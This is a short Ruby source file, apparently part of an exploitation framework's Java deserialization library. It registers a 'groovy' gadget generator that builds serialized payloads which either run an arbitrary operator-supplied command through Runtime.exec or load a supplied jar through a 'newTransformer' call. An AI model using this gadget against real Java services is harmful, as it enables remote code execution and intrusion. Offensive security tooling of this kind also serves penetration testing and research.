# -*- coding: binary -*-
require_relative '../../payloads/groovy'
require_relative '../../payloads/templates'

S=Rex::Java::Serialization 
class Groovy < S::Generator::Gadget
  def id
    'groovy'
  end

  def usable(ctx, params: {})
    return false unless ctx.gadget?('groovy')
    unless params.fetch('jar', nil).nil?
      return false unless S::Generator::Templates.supported(ctx,params)
    end
    true
  end

  def create(ctx, params: {})
    ctx.reg.load('model/groovy.json')

    if !params.fetch('cmd', nil).nil?
      S::Payloads::Groovy.make_runtime_exec(params['cmd'])
    elsif S::Generator::Templates.supported(ctx,params) 
      S::Payloads::Groovy.make_invoke_noarg(
        S::Generator::Templates.make(ctx,params), 
        'newTransformer')
    else
      raise 'Missing parameters'
    end
  end
end

S::Generator.register(
  Groovy.new
)
